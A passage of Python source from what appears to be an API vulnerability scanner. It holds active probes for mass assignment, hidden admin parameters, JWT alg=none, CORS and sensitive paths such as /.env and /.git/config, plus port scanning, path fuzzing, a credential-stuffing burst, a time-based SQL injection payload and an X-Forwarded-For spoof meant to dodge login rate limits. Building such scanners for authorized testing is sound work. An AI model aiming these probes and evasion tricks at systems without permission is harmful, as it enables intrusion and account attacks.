                        name="Mass Assignment (Read-Back Confirmed)",
                        severity="High",
                        description=f"Endpoint {method.upper()} {path} accepted a privileged payload AND persisted the sentinel `{sentinel}` server-side, confirming mass assignment.",
                        cvss=7.5, owasp="API3:2023 Broken Object Property Level Authorization",
                        confidence=Confidence.HIGH,
                        evidence={"sentinel": sentinel, "payload": payload},
                    )
            except Exception:
                continue
    except Exception:
        pass
    return None



def check_hidden_parameters(method, path, base_url, auth_headers):
    """
    Zero-FP hidden-parameter detector. We compare TWO baselines (taken from
    different mock IDs) to know how much natural variation the endpoint has,
    and only flag if the parameter-injected response differs by more than the
    natural variation.
    """
    if method != 'get':
        return None
    hidden_params = ['admin=true', 'debug=1', 'role=admin', 'is_admin=1']
    try:
        base1 = _build_url(base_url, generate_mock_param(path))
        base2 = _build_url(base_url, generate_mock_param(path))
        r1 = GLOBAL_SESSION.get(base1, headers=auth_headers, timeout=5)
        r2 = GLOBAL_SESSION.get(base2, headers=auth_headers, timeout=5)
        baseline_status = r1.status_code
        natural_drift = abs(len(r1.text) - len(r2.text))
        baseline_len = (len(r1.text) + len(r2.text)) // 2

        for param in hidden_params:
            fuzz_url = f"{base1}?{param}" if '?' not in base1 else f"{base1}&{param}"
            fuzz_res = GLOBAL_SESSION.get(fuzz_url, headers=auth_headers, timeout=5)

            # Hard bypass: route was blocked, now succeeds
            if fuzz_res.status_code == 200 and baseline_status not in (200, 404, 400):
                return build_finding(
                    name="Hidden Parameter Discovered (Auth Bypass)",
                    severity="High",
                    description=f"Endpoint {path} changed status from {baseline_status} to 200 when parameter `{param}` was added.",
                    cvss=7.5, owasp="API3:2023 Broken Object Property Level Authorization",
                    confidence=Confidence.HIGH,
                    evidence={"param": param, "baseline_status": baseline_status},
                )

            # Soft change: substantially more data than natural drift would explain
            if fuzz_res.status_code == 200 and baseline_status == 200:
                diff = abs(len(fuzz_res.text) - baseline_len)
                # Require BOTH absolute (>200 bytes) AND relative (>4x natural drift) signal
                if diff > 200 and diff > (natural_drift * 4 + 100):
                    return build_finding(
                        name="Hidden Parameter Discovered",
                        severity="Medium",
                        description=f"Endpoint {path} returned an unexpectedly different response ({diff} bytes vs natural drift {natural_drift}) when `{param}` was added.",
                        cvss=6.5, owasp="API3:2023 Broken Object Property Level Authorization",
                        confidence=Confidence.MODERATE,
                        evidence={"param": param, "size_delta": diff, "natural_drift": natural_drift},
                    )
    except Exception:
        pass
    return None



def check_unsafe_methods(path, base_url):
    """
    Zero-FP unsafe method check. Old logic fired if "Via" was in headers —
    but Cloudflare and other reverse proxies legitimately add `Via`. Now we
    require the TRACE method to actually ECHO our custom header back in the
    body, which is the actual security risk.
    """
    try:
        url = _build_url(base_url, path)
        trace_marker = make_anchor("trace")
        for method in ("TRACE", "TRACK"):
            try:
                res = GLOBAL_SESSION.request(method, url, headers={"X-Sentinel-Echo": trace_marker}, timeout=4)
                if res.status_code == 200 and trace_marker in (res.text or ""):
                    return build_finding(
                        name=f"Unsafe HTTP Method ({method})",
                        severity="Low",
                        description=f"Server echoes request headers via the {method} method on {path}, leaking sensitive headers (e.g. cookies) in cross-domain attacks.",
                        cvss=3.7, owasp="API8:2023 Security Misconfiguration",
                        confidence=Confidence.HIGH,
                        evidence={"method": method, "marker": trace_marker},
                    )
            except Exception:
                continue
    except Exception:
        pass
    return None



def check_jwt_weakness(auth_header):
    """
    Zero-FP JWT check. Old logic flagged HS256 as "Low" — but HS256 with
    a strong secret is industry-standard and not a vulnerability. We now
    only report alg=none, which IS unambiguously broken.
    """
    if not auth_header or "Bearer " not in auth_header:
        return None
    try:
        token = auth_header.split(" ", 1)[1]
        if token.count('.') < 2:
            return None
        header_segment = token.split(".")[0]
        padded = header_segment + '=' * (-len(header_segment) % 4)
        header_data = json.loads(base64.urlsafe_b64decode(padded))
        if str(header_data.get('alg', '')).lower() == 'none':
            return build_finding(
                name="Insecure JWT Algorithm (alg=none)",
                severity="Critical",
                description="JWT header advertises the `none` algorithm, meaning the server accepts unsigned tokens. Anyone can forge a token by setting the algorithm header and omitting the signature.",
                cvss=9.8, owasp="API2:2023 Broken Authentication",
                confidence=Confidence.DEFINITIVE,
                evidence={"alg": header_data.get('alg')},
            )
    except Exception:
        pass
    return None



def check_debug_endpoints(base_url):
    paths = [
        # Admin / Auth
        '/admin', '/api/admin', '/login', '/api/login', '/auth', '/administrator',
        # Configs / Secrets
        '/.env', '/.env.backup', '/config.json', '/appsettings.json', '/docker-compose.yml',
        # Source Control
        '/.git/config',
        # API Schemas (Very Valuable!)
        '/swagger.json', '/openapi.json', '/api-docs', '/v2/api-docs', '/v3/api-docs', '/docs', '/graphql', '/graphiql',
        # DevOps / Actuators
        '/metrics', '/health', '/actuator/health', '/actuator/env', '/server-status', '/phpinfo.php',
        # Backups
        '/backup.zip', '/dump.sql'
    ]
    clean_base = base_url.rstrip('/')
    findings = []
    def test_debug_path(p):
        try:
            url = f"{clean_base}{p}"
            res = GLOBAL_SESSION.get(url, timeout=3)
            if res.status_code == 200:
                html_lower = res.text.lower()
                is_login = False
                if "<form" in html_lower and "type=\"password\"" in html_lower:
                    is_login = True
                elif "keycloak administration" in html_lower or "title>login" in html_lower or "sign-in" in html_lower:
                    is_login = True
                
                if is_login:
                    # If it's a known auth platform or product login, it's not a vulnerability, it's just a portal
                    platform_keywords = ['keycloak', 'auth0', 'okta', 'microsoft login', 'identityserver']
                    if any(x in p.lower() for x in ['/auth', '/realms/', '/openid-connect']) or any(k in html_lower for k in platform_keywords):
                        return None
                    return {"path": p, "vuln": {"name": "Exposed Login Portal", "severity": "Low", "description": f"Login page or Auth SPA accessible at {p}.", "cvss": 3.0, "owasp": "API9:2023 Improper Inventory Management"}}
                
                sensitive_keywords = ["admin dashboard", "configuration", "wp-admin", "django administration", "phpmyadmin", "swagger ui", "openapi"]
                content_type = res.headers.get('Content-Type', '').lower()
                
                if any(kw in html_lower for kw in sensitive_keywords) or 'application/json' in content_type:
                    # Exclude standard public discovery paths
                    if '.well-known' in p.lower():
                        return None
                    return {"path": p, "vuln": {"name": "Exposed Sensitive Path", "severity": "Medium", "description": f"Path {p} is accessible and contains sensitive data or API schema.", "cvss": 5.8, "owasp": "API9:2023 Improper Inventory Management"}}
        except Exception: pass
        return None

    futures = [SUB_TASK_EXECUTOR.submit(test_debug_path, p) for p in paths]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result: findings.append(result)
    return findings

def check_open_ports(base_url):
    open_ports = []
    try:
        host = urlparse(base_url).hostname
        if not host: return None
        ports_to_check = {22: "SSH", 3306: "MySQL", 5432: "PostgreSQL", 27017: "MongoDB", 6379: "Redis"}
        for port, service in ports_to_check.items():
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.5)
                if s.connect_ex((host, port)) == 0:
                    open_ports.append(f"{port} ({service})")
        if open_ports:
            return {"name": "Exposed Infrastructure Services", "severity": "High", "description": f"The following sensitive ports are publicly exposed: {', '.join(open_ports)}. [Violates NIST SP 800-53]", "cvss": 7.5, "owasp": "API8:2023 Security Misconfiguration"}
    except Exception: pass
    return None

def check_cors_policy(base_url):
    try:
        clean_base = base_url.rstrip('/')
        headers = {'Origin': 'https://evil-attacker.com'}
        # Active CORS checking
        res = GLOBAL_SESSION.options(clean_base, headers=headers, timeout=5)
        acao = res.headers.get('Access-Control-Allow-Origin', '')
        if acao == '*' or acao == 'https://evil-attacker.com':
            return {"name": "Insecure CORS Policy (Dynamic)", "severity": "Medium", "description": f"The server explicitly allowed cross-origin requests from an untrusted origin: Access-Control-Allow-Origin: {acao}", "cvss": 6.5, "owasp": "API8:2023 Security Misconfiguration"}
    except Exception: pass
    return None

def run_osint_recon(base_url, logger=None):
    """
    Queries the Wayback Machine CDX API to find historical URLs for the target domain.
    Filters out static assets and returns a list of potential API endpoints.
    """
    osint_paths = []
    try:
        domain = urlparse(base_url).netloc
        if not domain or "localhost" in domain or "127.0.0.1" in domain:
            return []
            
        if logger: logger(f"  [*] OSINT Engine: Querying Wayback Machine for {domain}...")
        
        cdx_url = f"http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey&limit=20"
        res = GLOBAL_SESSION.get(cdx_url, timeout=5)
        
        if res.status_code == 200:
            data = res.json()
            # data is a list of lists: [["original"], ["http://example.com/api/v1/users"], ...]
            if len(data) > 1:
                urls = [item[0] for item in data[1:]]
                for u in urls:
                    try:
                        parsed = urlparse(u)
                        path = parsed.path
                        # Strict filtering to ignore static files and root paths
                        if not path or path == '/': continue
                        if re.search(r'\.(jpg|jpeg|png|gif|svg|css|js|woff|woff2|ttf|eot|ico|pdf|zip|tar|gz)$', path, re.IGNORECASE):
                            continue
                            
                        # Look for API-like paths
                        if '/api/' in path.lower() or 'graphql' in path.lower() or path.endswith('.json'):
                            osint_paths.append(path)
                    except Exception: pass
                    
        osint_paths = list(set(osint_paths))
        if logger and osint_paths:
            logger(f"  [+] OSINT Engine: Extracted {len(osint_paths)} historical API paths from Internet Archive.")
            
    except Exception as e:
        if logger: logger(f"  [-] OSINT Engine failed: {str(e)}")
        
    return osint_paths

def find_hidden_api_endpoints(base_url, auth_headers=None, baseline=None, tech_stack=None, logger=None, is_smart_fuzz=True, existing_vulns=None):
    found_vulns = existing_vulns.copy() if existing_vulns else []
    found_endpoints = []
    clean_base = base_url.rstrip('/')
    
    def log(msg):
        if logger: logger(msg)

    # 1. Robots.txt / Sitemap Recon
    try:
        robots_res = GLOBAL_SESSION.get(f"{clean_base}/robots.txt", timeout=2)
        if robots_res.status_code == 200:
            disallowed = re.findall(r'Disallow:\s*(/.*)', robots_res.text)
            for d in disallowed:
                if 'api' in d.lower():
                    found_vulns.append({"name": "Hidden API Discovered (Recon)", "severity": "Medium", "description": f"Robots.txt leaks hidden API path: {d}. [Violates NIST SP 800-53 CM-8]", "cvss": 5.0, "owasp": "API9:2023 Improper Inventory Management"})
                    found_endpoints.append(f"GET {d}")
    except Exception: pass

    # 2. Extract from Javascript files (Crawling frontend SPA)
    try:
        root_res = GLOBAL_SESSION.get(clean_base, timeout=3)
        scripts = re.findall(r'<script\s+[^>]*src=["\']([^"\']+)["\']', root_res.text)
        for script in scripts[:10]:  # Deep Scraping: Analyze top 10 JS bundles
            s_url = script if script.startswith('http') else f"{clean_base}/{script.lstrip('/')}"
            try:
                s_res = GLOBAL_SESSION.get(s_url, timeout=3)
                if s_res.status_code == 200:
                    # Enhanced Deep JS Regex for endpoints
                    api_paths = set(re.findall(r'["\'](/api/[a-zA-Z0-9_\-/\.]+)["\']', s_res.text))
                    for ap in api_paths:
                        found_endpoints.append(f"GET {ap}")
                        found_endpoints.append(f"POST {ap}")
                        
                # 2.2 Source-Map Decompilation (Deep Recon)
                map_url = f"{s_url}.map"
                try:
                    m_res = GLOBAL_SESSION.get(map_url, timeout=3)
                    if m_res.status_code == 200:
                        if logger: logger(f"[*] Found Source-Map: {map_url.split('/')[-1]} - Decompiling...")
                        # Extract strings from the map JSON which often contain raw routes
                        map_paths = set(re.findall(r'["\'](/api/[a-zA-Z0-9_\-/\.]+)["\']', m_res.text))
                        for mp in map_paths:
                            found_endpoints.append(f"GET {mp}")
                            found_endpoints.append(f"POST {mp}")
                except Exception: pass
            except Exception: pass
    except Exception: pass

    # 2.5 OSINT Shadow API Discovery
    osint_paths = run_osint_recon(clean_base, logger)

    # 3. Enhanced API Fuzzing Dictionary (Massive Enterprise Wordlist)
    fuzz_paths = [
        # Base Paths
        '/api', '/api/v1', '/api/v2', '/api/v3', '/v1', '/v2', '/v3', '/graphql', '/graph', '/api/graphql',
        
        # Authentication & Authorization
        '/auth', '/auth/login', '/auth/register', '/auth/token', '/auth/refresh', '/auth/logout',
        '/api/auth/login', '/api/auth/register', '/api/v1/auth', '/login', '/register', '/oauth/token',
        '/oauth2/token', '/sso/login', '/jwt/token', '/jwt/refresh', '/api/token',
        
        # OpenID & Configs
        '/.well-known/openid-configuration', '/.well-known/jwks.json', '/realms/master/.well-known/openid-configuration',
        '/swagger.json', '/api-docs', '/v2/api-docs', '/v3/api-docs', '/openapi.json', '/docs', '/api/docs',
        '/swagger-ui.html', '/config', '/api/config', '/env', '/.env', '/actuator/env',
        
        # Admin & Dev
        '/admin', '/api/admin', '/admin/login', '/admin/users', '/admin/dashboard', '/api/v1/admin',
        '/dev', '/api/dev', '/beta', '/test', '/api/test', '/debug', '/api/debug',
        '/actuator', '/actuator/health', '/health', '/healthcheck', '/ping', '/metrics', '/actuator/metrics',
        
        # Users & Accounts
        '/users', '/api/users', '/api/v1/users', '/api/v2/users', '/user', '/api/user',
        '/users/me', '/api/users/me', '/profile', '/api/profile', '/account', '/api/account',
        '/customers', '/api/customers', '/employees', '/api/employees', '/members', '/staff',
        
        # E-commerce / General Objects
        '/products', '/api/products', '/orders', '/api/orders', '/cart', '/api/cart',
        '/payments', '/api/payments', '/invoices', '/transactions', '/billing',
        '/items', '/files', '/uploads', '/images', '/documents', '/data',
        
        # Education / LMS-style targets
        '/students', '/api/students', '/teachers', '/api/teachers', '/courses', '/api/courses',
        '/classes', '/lessons', '/exams', '/grades', '/marks', '/assignments', '/school',
        
        # Common bypass variations
        '/api/private/users', '/api/internal/users', '/internal/api', '/private/api',
        '/v1.1', '/v1.2', '/api/v1.1', '/api/v1.0'
    ]
    
    # Smart Wordlists based on Tech Stack
    if tech_stack:
        if tech_stack.get('language') == 'python/django':
            fuzz_paths.extend(['/api-auth/', '/django-admin/', '/admin/auth/user/'])
        elif tech_stack.get('language') == 'nodejs/express':
            fuzz_paths.extend(['/api/v1/users', '/api/auth/register'])
        elif tech_stack.get('language') == 'php':
            fuzz_paths.extend(['/api.php', '/wp-json/wp/v2/users'])
    
    fuzz_paths.extend(osint_paths)
    
    if is_smart_fuzz:
        # --- SMART FUZZER BASELINE CAPTURE ---
        baseline_404_len = 0
        baseline_404_status = 404
        try:
            baseline_res = GLOBAL_SESSION.get(f"{clean_base}/apisentinel_baseline_404_{uuid.uuid4().hex[:8]}", timeout=3)
            baseline_404_len = len(baseline_res.text)
            baseline_404_status = baseline_res.status_code
            if logger: logger(f"[*] Fuzzing Baseline Captured: {baseline_404_status} ({baseline_404_len} bytes)")
        except Exception: pass

        to_fuzz = list(set([p.split(" ")[1] if " " in p else p for p in found_endpoints] + fuzz_paths))
        
        import threading
        vuln_lock = threading.Lock()

        def test_fuzz_path(p):
            try:
                # Ensure path starts with /
                test_path = p if p.startswith('/') else f"/{p}"
                
                # Deduplication check
                if any(v['path'] == test_path for v in found_vulns if 'path' in v):
                    return

                res = GLOBAL_SESSION.get(f"{clean_base}{test_path}", headers=auth_headers, timeout=2)
                
                # ZERO FALSE POSITIVE LOGIC: 
                # 1. Compare against baseline 404
                if res.status_code == baseline_404_status and abs(len(res.text) - baseline_404_len) < 50:
                    return # It's just a 404

                is_json = 'application/json' in res.headers.get('Content-Type', '').lower()
                
                # Reachable API (Success or Auth Error both count as discovery)
                if res.status_code in [200, 201, 202, 204, 401, 403, 405]:
                    # --- WILDCARD / PATTERN DETECTION ---
                    # If it's a sensitive path (like .env), verify it's not a generic wildcard block
                    if any(x in test_path.lower() for x in ['.env', 'admin', 'config']):
                        # Test a randomized version of the same pattern
                        random_test_path = f"{test_path}_{uuid.uuid4().hex[:4]}"
                        try:
                            wildcard_res = GLOBAL_SESSION.get(f"{clean_base}{random_test_path}", headers=auth_headers, timeout=2)
                            if wildcard_res.status_code == res.status_code and abs(len(wildcard_res.text) - len(res.text)) < 50:
                                # It's a generic pattern block (e.g. WAF blocks all /.env*), not a specific file.
                                if logger: logger(f"  [-] Suppressing Wildcard Block: {test_path} (Detected generic pattern match)")
                                return 
                        except Exception: pass

                    with vuln_lock:
                        method = "GET" if res.status_code != 405 else "POST"
                        full_endpoint = f"{method} {test_path}"
                        if full_endpoint not in found_endpoints:
                            found_endpoints.append(full_endpoint)
                            if logger: logger(f"  [+] Recon Found: Undocumented API Found -> {test_path} ({res.status_code})")
                            
                            # Add to vulnerabilities if it's sensitive and NOT already flagged
                            if any(x in test_path.lower() for x in ['admin', 'config', 'env', 'debug', 'test']):
                                # --- PLATFORM AWARE SUPPRESSION ---
                                # If it's a known auth platform product, don't flag its standard paths
                                platform_keywords = ['keycloak', 'auth0', 'okta', 'microsoft login', 'identityserver']
                                body_lower = res.text.lower()
                                if any(k in body_lower for k in platform_keywords):
                                    return

                                # --- PROTOCOL EXCLUSION ---
                                # Exclude standard OIDC / well-known discovery paths (they are public by design)
                                if '.well-known' in test_path.lower() or '/openid-connect' in test_path.lower():
                                    return

                                # --- PARENT SUPPRESSION ---
                                # If /admin is flagged, don't flag /admin/login unless it's a 200 vs 405
                                parent_path = "/".join(test_path.rstrip('/').split("/")[:-1])
                                if parent_path and any(v.get('path') == parent_path for v in found_vulns):
                                    return

                                # Refined Severity: 
                                # 200 Sensitive = High
                                # 405 Sensitive = Medium
                                sev = "High" if res.status_code == 200 else "Medium"
                                cvss = 7.5 if res.status_code == 200 else 5.0
                                
                                found_vulns.append({
                                    "path": test_path,
                                    "name": "Undocumented Admin/Sensitive API Found", 
                                    "severity": sev, 
                                    "description": f"Shadow API hunting discovered an undocumented sensitive endpoint: {test_path} (Status: {res.status_code}). [Violates API9:2023]", 
                                    "cvss": cvss, 
                                    "owasp": "API9:2023 Improper Inventory Management"
                                })
            except Exception: pass

        futures = [SUB_TASK_EXECUTOR.submit(test_fuzz_path, p) for p in to_fuzz]
        concurrent.futures.wait(futures)
        
    # GraphQL Introspection Check
    graphql_paths = [p for p in found_endpoints if 'graphql' in p.lower()]
    for gp in graphql_paths:
        try:
            url = f"{clean_base}{gp.split(' ')[1]}"
            introspection_query = {"query": "{ __schema { types { name fields { name } } } }"}
            res = GLOBAL_SESSION.post(url, json=introspection_query, timeout=4)
            if res.status_code == 200 and 'data' in res.text and '__schema' in res.text:
                found_vulns.append({"name": "GraphQL Introspection Enabled", "severity": "High", "description": f"Endpoint {gp.split(' ')[1]} allows unauthenticated schema introspection, leaking the entire database architecture. [Violates API9:2023]", "cvss": 7.3, "owasp": "API9:2023 Improper Inventory Management"})
        except Exception: pass
        
    if found_endpoints:
        log(f"     [+] Recon Engine discovered {len(set(found_endpoints))} potential endpoints dynamically.")
        
    return found_vulns, list(set(found_endpoints))

def perform_automated_login(login_url, username, password, auth_type='jwt', logger=None):
    """
    Enterprise Multi-Auth Extractor.
    Automatically logs into a target and extracts JWTs, OAuth2 tokens, or Session Cookies.
    """
    def log(msg):
        if logger: logger(msg)
        
    log(f"[*] Auth Crawler: Attempting automated login against {login_url}...")
    
    # IP Spoofing to bypass basic login rate limiters
    headers = {
        "X-Forwarded-For": "127.0.0.1",
        "Content-Type": "application/json"
    }
    
    payload = {"username": username, "password": password}
    if auth_type == 'oauth2':
        payload = {"client_id": username, "client_secret": password, "grant_type": "client_credentials"}
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        
    try:
        if auth_type == 'oauth2':
            res = GLOBAL_SESSION.post(login_url, data=payload, headers=headers, timeout=5)
        else:
            res = GLOBAL_SESSION.post(login_url, json=payload, headers=headers, timeout=5)
            
        if res.status_code not in [200, 201]:
            log(f"[-] Auth Crawler: Login failed with status {res.status_code}")
            return None
            
        # 1. Cookie Extraction
        if auth_type == 'cookie':
            if res.cookies:
                cookie_str = "; ".join([f"{k}={v}" for k, v in res.cookies.items()])
                log("[+] Auth Crawler: Successfully extracted Session Cookie.")
                return {"Cookie": cookie_str}
            else:
                log("[-] Auth Crawler: No cookies returned by server.")
                return None
                
        # 2. JWT / Token Extraction
        data = res.json()
        token = data.get("access_token") or data.get("token") or data.get("jwt")
        if token:
            log("[+] Auth Crawler: Successfully extracted JWT/Access Token.")
            return {"Authorization": f"Bearer {token}"}
        else:
            log("[-] Auth Crawler: Could not find token in JSON response.")
            return None
            
    except Exception as e:
        log(f"[-] Auth Crawler Error: {e}")
        return None

def check_credential_stuffing(login_url, logger=None):
    """
    Fires rapid requests with bad credentials to see if the server lacks rate limiting on the auth endpoint.
    """
    def log(msg):
        if logger: logger(msg)
        
    log(f"[*] Auth Crawler: Running Credential Stuffing & Brute Force check...")
    import concurrent.futures
    
    def send_bad_login(i):
        try:
            GLOBAL_SESSION.post(login_url, json={"username": f"admin{i}", "password": "password123"}, timeout=2)
            return True
        except Exception:
            return False
            
    success_count = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        results = list(executor.map(send_bad_login, range(20)))
        success_count = sum(results)
        
    # Send one more after the barrage to see if we are blocked
    try:
        res = GLOBAL_SESSION.post(login_url, json={"username": "test", "password": "123"}, timeout=2)
        if res.status_code == 429:
            log("[+] Auth Crawler: Rate Limit detected on login. Safe.")
            return None
        elif res.status_code in [401, 403]:
            # Still returning auth errors = No rate limit
            log("[!] Auth Crawler: Server failed to block Brute Force attack.")
            return {
                "name": "Credential Stuffing / Brute Force Vulnerability", 
                "severity": "High", 
                "description": f"Login endpoint {login_url} lacks rate limiting. API Sentinel successfully fired 20 rapid login requests without being blocked (Status: {res.status_code}). [Violates API4:2023]", 
                "cvss": 7.5, 
                "owasp": "API4:2023 Unrestricted Resource Consumption"
            }
    except Exception: pass
    return None


# ==============================================================================
# VERIFICATION ROUND — drops findings that don't replicate, boosts those that do
# ==============================================================================
def _reverify_finding(finding, base_url, auth_headers):
    """
    Re-runs the underlying probe for a single finding. Returns True if the
    second run reproduces the same evidence, False otherwise.
    """
    name = finding.get("name", "")
    ev = finding.get("evidence", {}) or {}
    path = finding.get("path") or ev.get("path") or ""
    try:
        # Findings without endpoint context can't be re-verified by URL — keep them.
        if name.startswith("Insecure JWT") or name == "Out-of-Band (Blind) Vulnerability Confirmed":
            return True
        if not path:
            return True

        # Re-fetch with same auth and assert the original signal is still present
        url = _build_url(base_url, re.sub(r"\{.*?\}", "1", path))
        if name.startswith("Broken Authentication"):
            r1 = GLOBAL_SESSION.get(url, timeout=4)
            if r1.status_code not in (200, 201, 202, 204):
                return False
            return looks_like_meaningful_data(r1.text or "", r1.headers.get('Content-Type', ''))

        if name.startswith("SQL Injection") or name.startswith("NoSQL Injection"):
            payload = ev.get("payload")
            if not payload:
                return True
            try:
                r = GLOBAL_SESSION.get(f"{url}?q={payload}&id=1", headers=auth_headers, timeout=5)
                return detect_db_error(r.text or "") is not None
            except Exception:
                return False

        if name == "Reflected XSS":
            payload = ev.get("payload")
            if not payload:
                return True
            anchor2 = make_anchor("verify")
            r = GLOBAL_SESSION.get(f"{url}?q={anchor2}{payload}", headers=auth_headers, timeout=5)
            return anchor2 in (r.text or "")

        if name == "OS Command Injection":
            return True  # We required /etc/passwd or `id` output already — definitive

        if name.startswith("Time-based Blind"):
            payload = ev.get("payload") or "1' AND SLEEP(5)--"
            samples = collect_timing_samples(
                lambda: GLOBAL_SESSION.get(url, headers=auth_headers, timeout=3),
                n=4,
            )
            try:
                import time
                t0 = time.time()
                GLOBAL_SESSION.get(f"{url}?q={payload}", headers=auth_headers, timeout=8)
                elapsed2 = time.time() - t0
            except Exception:
                elapsed2 = 0
            return statistical_timing_test(samples, elapsed2)

        if name.startswith("Missing Rate Limiting"):
            # Re-burst and ensure server STILL doesn't push back
            futures = [SUB_TASK_EXECUTOR.submit(lambda: GLOBAL_SESSION.get(url, headers=auth_headers, timeout=2)) for _ in range(10)]
            statuses = []
            for f in concurrent.futures.as_completed(futures):
                try:
                    statuses.append(f.result().status_code)
                except Exception:
                    pass
            return not any(s == 429 for s in statuses) and sum(1 for s in statuses if 200 <= s < 300) >= 8

        if name.startswith("Excessive Data"):
            r = GLOBAL_SESSION.get(url, headers=auth_headers, timeout=5)
            body = r.text or ""
            cats = ev.get("categories", [])
            if "Credit Card" in cats:
                return any(luhn_check(m.group(0)) for m in re.finditer(r"\d{13,19}", body))
            if "Email" in cats:
                return any(is_real_email(m.group(0)) for m in re.finditer(r"[a-zA-Z0-9_.+\-]+@[a-zA-Z0-9\-]+\.[a-zA-Z0-9\-.]+", body))
            if "SSN" in cats:
                return any(is_real_ssn(m.group(0)) for m in re.finditer(r"\d{3}-\d{2}-\d{4}", body))
            return True

        # Default: keep the finding (it passed the original check)
        return True
    except Exception:
        return True  # Don't drop findings due to verification errors


def run_verification_round(report, base_url, auth_headers, threshold, logger=None):
    """
    Re-tests every finding in the report. Drops findings that fail the second
    run; boosts confidence on findings that confirm; filters by threshold.
    Returns the updated report.
    """
    def log(msg):
        if logger: logger(msg)

    findings = report.get("vulnerabilities", [])
    if not findings:
        return report

    log(f"[*] Verification Round: re-testing {len(findings)} candidate findings (threshold={threshold})...")

    verified = []
    dropped = 0
    for f in findings:
        # Ensure every finding has a confidence score, even legacy ones
        if "confidence" not in f:
            f["confidence"] = Confidence.LOW

        try:
            ok = _reverify_finding(f, base_url, auth_headers)
        except Exception:
            ok = True

        if ok:
            boost_confidence(f, delta=10)
            verified.append(f)
        else:
            f["confidence"] = max(0, int(f.get("confidence", 0)) - 30)
            log(f"     [-] Dropped (failed verification): {f.get('name')} (now {f['confidence']})")
            dropped += 1

    # Apply confidence threshold
    surviving = filter_by_confidence(verified, threshold)
    cut = len(verified) - len(surviving)
    if cut:
        log(f"     [-] Suppressed {cut} finding(s) below confidence {threshold}")

    log(f"[+] Verification: {len(surviving)} confirmed / {dropped} dropped / {cut} suppressed")
    # Sort: highest confidence + severity first
    sev_rank = {"Critical": 4, "High": 3, "Medium": 2, "Low": 1}
    surviving.sort(key=lambda v: (sev_rank.get(v.get("severity", "Low"), 0), v.get("confidence", 0)), reverse=True)
    # Decorate every finding with its MITRE ATT&CK technique mapping for
    # SIEM / heat-map consumption. Done after sorting so the report is
    # deterministic.
    try:
        from .mitre import annotate_findings, build_heatmap
        annotate_findings(surviving)
        report["mitre_attack_summary"] = build_heatmap(surviving)
    except Exception as e:
        log(f"[-] MITRE annotation failed: {e}")
    report["vulnerabilities"] = surviving
    return report


# ==============================================================================
# MASTER SCAN FUNCTION (UPDATED)
# ==============================================================================
def start_scan(spec_content, base_url, auth_headers, scan_options=None, logger=None, report_id=None, secondary_auth_headers=None):
    def log(msg):
        with scan_lock:
            print(msg)
            if logger: logger(msg)

    if scan_options is None:
        scan_options = {
            'bola': True, 'auth': True, 'injection': True, 'ratelimit': True,
            'jwt': True, 'debug': True,
            'ssrf': True, 'sensitive_data': True, 'hidden_params': True,
            'mass_assignment': True, 'xxe': True, 'unsafe_methods': True,
        }

    log(f"[*] Initializing scan for: {base_url}")
    
    passive_scanner = APIScanner(spec_content=spec_content, target_base_url=base_url)
    report = passive_scanner.run_passive_scan()
    
    oast_token = None
    oast_url = None
    if report_id:
        oast_token = f"TKN-{report_id}-{uuid.uuid4().hex[:8]}"
        # OAST callback URL is read from Django settings (OAST_PUBLIC_BASE_URL).
        # For real blind-vuln detection, point this at a publicly reachable host
        # (e.g. an ngrok tunnel) via the OAST_PUBLIC_BASE_URL env var.
        try:
            from django.conf import settings as _dj_settings
            _oast_base = getattr(_dj_settings, 'OAST_PUBLIC_BASE_URL', 'http://127.0.0.1:8000')
        except Exception:
            _oast_base = 'http://127.0.0.1:8000'
        oast_url = f"{_oast_base.rstrip('/')}/api/oast/catch/{oast_token}/"
        log(f"[*] Generated OAST Token: {oast_token}")
        log(f"[*] OAST Callback URL: {oast_url}")
    
    if report['status'] == 'Failed':
        log("[!] Warning: Could not parse OpenAPI spec. Proceeding with Host-Level checks.")
        endpoints = []
    else:
        endpoints = report.get("endpoints", [])
        log(f"[+] Successfully parsed {len(endpoints)} endpoints.")
        
    is_bfla_test = False
    
    # ==========================================================================
    # ENTERPRISE AUTH CRAWLER LOGIC
    # ==========================================================================
    if scan_options and scan_options.get('auth_login_url'):
        login_url = scan_options['auth_login_url']
        auth_type = scan_options.get('auth_type', 'jwt')
        
        # 1. Credential Stuffing Check
        stuffing_vuln = check_credential_stuffing(login_url, logger)
        if stuffing_vuln:
            report.setdefault("vulnerabilities", []).append(stuffing_vuln)
            
        # 2. Automated Admin Login
        admin_user = scan_options.get('admin_username')
        admin_pass = scan_options.get('admin_password')
        if admin_user and admin_pass:
            extracted_headers = perform_automated_login(login_url, admin_user, admin_pass, auth_type, logger)
            if extracted_headers:
                auth_headers = extracted_headers
            else:
                log("[-] Warning: Failed to extract Admin auth token. Proceeding without authentication.")
                
        # Determine if we are doing Dual-Role (BFLA) Testing
        is_bfla_test = bool(scan_options.get('user_username') and scan_options.get('user_password'))
        low_priv_headers = None
        if is_bfla_test:
            log("[*] Privilege Escalation Matrix Enabled: Will test Admin endpoints with Standard User credentials.")
            low_priv_user = scan_options.get('user_username')
            low_priv_pass = scan_options.get('user_password')
            low_priv_headers = perform_automated_login(login_url, low_priv_user, low_priv_pass, auth_type, logger)
            if not low_priv_headers:
                log("[-] Warning: Failed to extract Standard User auth token. BFLA tests might fail.")
            
    log("\n[*] Starting Active Scan Phase...")

    # --- Always-on calibration so endpoint checks (e.g. injection) have what they need ---
    # Pro Optimization: Tech-Stack Fingerprinting (used by injection payload filtering)
    tech_stack = detect_tech_stack(base_url, logger)

    # Calibrate Zero-False-Positive Baseline (used by WAF bypass / shadow API recon)
    baseline = calibrate_baseline(base_url, auth_headers)
    log(f"[*] Firewall Baseline Captured: {baseline['status']} ({baseline['length']} bytes)")

    # --- Run Global Checks ---
    if scan_options.get('debug'):
        if report_id:
            from .models import ScanReport
            if ScanReport.objects.get(id=report_id).status == "Stopped":
                log("[!] Scan stopped by user command.")
                report['status'] = "Stopped"
                return report

        debug_findings = check_debug_endpoints(base_url)
        for f in debug_findings:
            v = f['vuln']
            if v not in report["vulnerabilities"]:
                v['path'] = f['path'] # Attach path for deduplication in next phase
                report["vulnerabilities"].append(v)
                log(f"     [!] Found: {v['name']} at {f['path']}")

        vuln = check_cors_policy(base_url)
